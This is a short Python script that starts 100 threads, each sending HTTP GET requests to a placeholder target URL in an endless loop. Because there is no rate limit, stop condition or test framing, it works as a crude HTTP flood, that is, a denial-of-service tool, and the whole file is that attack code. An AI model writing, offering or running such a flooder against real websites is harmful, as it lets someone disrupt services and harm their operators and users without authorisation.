import threading
import requests

# Target URL
target_url = 'http://example.com'

# Number of threads
num_threads = 100

def send_request():
    while True:
        try:
            response = requests.get(target_url)
            print(f'Request sent! Status code: {response.status_code}')
        except requests.exceptions.RequestException as e:
            print(f'Error sending request: {e}')

# Create threads
threads = []
for i in range(num_threads):
    thread = threading.Thread(target=send_request)
    thread.daemon = True
    threads.append(thread)

# Start threads
for thread in threads:
    thread.start()

# Keep the main thread running
for thread in threads:
    thread.join()
